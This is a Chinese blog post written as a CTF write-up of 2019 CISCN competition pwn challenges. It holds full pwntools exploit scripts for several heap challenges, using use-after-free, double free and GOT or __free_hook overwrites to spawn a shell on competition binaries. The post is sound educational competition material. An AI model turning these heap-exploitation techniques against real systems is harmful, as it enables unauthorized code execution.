---
title: 成都摸鱼记.md
date: 2019-07-29 22:03:24
tags: "pwn"
cover: /img/5e568d5c56a51.jpg
---
去成都摸了两天鱼。满打满算从开始打pwn到现在刚刚十个月，打这么大的国家级比赛还是第一次，本来指望着不垫底就好，没想到居然水到一个国一，虽然含金量比以前低了不少。  
趁着对题目还有印象，写个WP好了。
____
# Day 1 
## Ciscn-c02 EscapeVM
一直不会VM，现在还是不会。  
## Ciscn-c05 inode-heap
比赛后才了解到`open`返回的是一个文件描述符，而非文件指针。进程维护了一个文件描述符表，相关操作查表得到文件指针后进入下一步。不过我在调试中并没有在堆区找到对应的`IO-File`结构体。  
```python
from pwn import *
r = process('./inode_heap')
# context.log_level = 'debug'


def add(type, number):
    r.sendlineafter('which command?\n> ', '1')
    r.sendlineafter('TYPE:\n1: int\n2: short int\n>', str(type))
    r.sendlineafter('your inode number:', str(number))


def delete(type):
    r.sendlineafter('which command?\n> ', '2')
    r.sendlineafter('TYPE:\n1: int\n2: short int\n>', str(type))


def show(type):
    r.sendlineafter('which command?\n> ', '3')
    r.sendlineafter('TYPE:\n1: int\n2: short int\n>', str(type))


add(1, 0)
delete(1)
add(2, 0)
add(2, 0)
add(2, 0)
add(2, 0)
delete(1)
show(1)
r.recvuntil('your int type inode number :')
s = r.recvline()
heap = int(s)+0x100000000
print hex(heap)
add(2, 1)
delete(2)
add(1, int(s))
delete(2)
add(2, int(s)-16)
add(2, 1)
add(2, 0x91)
add(1, int(s))
for i in range(7):
    delete(1)
    add(2, 0)
delete(1)
show(1)
r.recvuntil('your int type inode number :')
s = r.recvline()
libc = int(s)+0x100000000
print hex(libc)
add(2, int(s)-560)
add(1, int(s)-560)
add(1, 666)
r.interactive()
```
## Ciscn-c06
程序只有`Add`与`Delete`两个操作，很容易就看得到一个UAF
![](/img/e8s6eS.png)  
但是保护全开加上无leak，又限制了分配区块大小。没办法搞出libc地址，然后就整了个野路子。   
![](/img/e8yo9A.png)  
在堆区可以发现这样一个巨他妈大的的东西，来历不明，好像是C++才会有的？  
我们面对的主要问题是没有足够大小的chunk进`Unsorted Bin`，partial overwrite都搓不出来，于是我产生了一个大胆的想法。  
![](/img/e86avt.png)   
我把这个巨他妈大的chunk free掉了。  
接着partial write，把`__free_hook`malloc到手，接着就完了。  
赛后问了一圈发现居然都是打的`IO-File`，所以这是个非预期？  
exp如下
```py
from pwn import *
r = process('./pwn')
# r = remote('172.16.9.21', 9006)


def add(index, size, s):
    r.sendlineafter('choice >', '1')
    r.sendlineafter('input the index', str(index))
    r.sendlineafter('input the size', str(size))
    r.sendafter('now you can write something', s)


def delete(index):
    r.sendlineafter('choice >', '2')
    r.sendlineafter('input the index', str(index))


add(0, 0x20, 'aaa')
r.recvuntil('gift :')
s = r.recv(14)
tofree = int(s, 16)-0x11c20
delete(0)
delete(0)
add(1, 0x20, p64(tofree+0x10))
add(2, 0x20, 'aaa')
add(3, 0x20, 'aaa')
add(4, 0x40, 'aa')
# add(15, 0x40,)
delete(3)
delete(4)
delete(4)
add(5, 0x40, p64(tofree+0x10))
add(6, 0x40, 'aaa')
add(7, 0x40, 'aaa')
add(8, 0x40, '????')
r.recvuntil('gift :')
s = r.recv(14)
libc = int(s, 16)-4111520
freehook = libc+4118760
system = libc+324672
print hex(freehook)
add(9, 0x60, 'aa')
delete(9)
delete(9)
add(10, 0x60, p64(freehook))
add(11, 0x60, '???')
add(12, 0x60, p64(system))
add(13, 0x50, '/bin/sh\0')
delete(13)
r.interactive()
```
## Ciscn-c07
没看
## Ciscn-c08 
水题，index为0x10时会让chunk偏0x10个字节，造假chunk就完事了。  
不过依然有一个问题，没办法leak，我选择了劫持got表并把`free`改成`puts`，然后再改成`system`，似乎大家又都是`IO-File`做的？  
exp
```py
from pwn import *
# r = process('./pwn')
r = remote('172.16.9.21', 9008)
context.log_level = 'debug'


def add(index, size, s):
    r.sendlineafter('your choice: ', '1')
    r.sendlineafter('index: ', str(index))
    r.sendlineafter('size: ', str(size))
    r.sendafter('content: ', s)


def delete(index):
    r.sendlineafter('your choice: ', '2')
    r.sendlineafter('index: ', str(index))


def edit(index, s):
    r.sendlineafter('your choice: ', '3')
    r.sendlineafter('index: ', str(index))
    r.sendafter('content: ', s)


# add(1, 0xe0, '??')
add(1, 0x10, '??')
r.recvuntil('low 12 bits: 0x')
s = r.recv(3)
base = int(s, 16)
print hex(base)
over = base+0x10
add(15, 0xe0-over % 0x100, '??')
add(16, 0x70, p64(0)+p64(0x4f1))
add(3, 0x70, 'gg')
add(4, 0x70, 'gg')
add(5, 0x70, 'gg')
add(6, 0x70, 'gg')
add(7, 0x70, 'gg')
add(8, 0x1f0, '/bin/sh\0')
add(8, 0x20, '/bin/sh\0')
add(9, 0x20, 'aa')
delete(0)
add(10, 0x60, '??')
add(11, 0x70, '??')
delete(3)
edit(0xb, p64(0x602010))
add(1, 0x70, 'aa')
add(13, 0x70, p64(0)+p64(0x400790))
delete(4)
s = r.recv(6)
libc = u64(s.ljust(8, '\0'))-0x3ebca0
print hex(libc)
system = libc+324672
edit(0xd, p64(0)+p64(system))
delete(8)
# gdb.attach(r)
r.interactive()
```
# Day 2
## Ciscn-c16
LCTF2018原题，比赛时心态崩了居然没做出来


## Ciscn-c17
整型溢出加Double Free加shellcode，太水了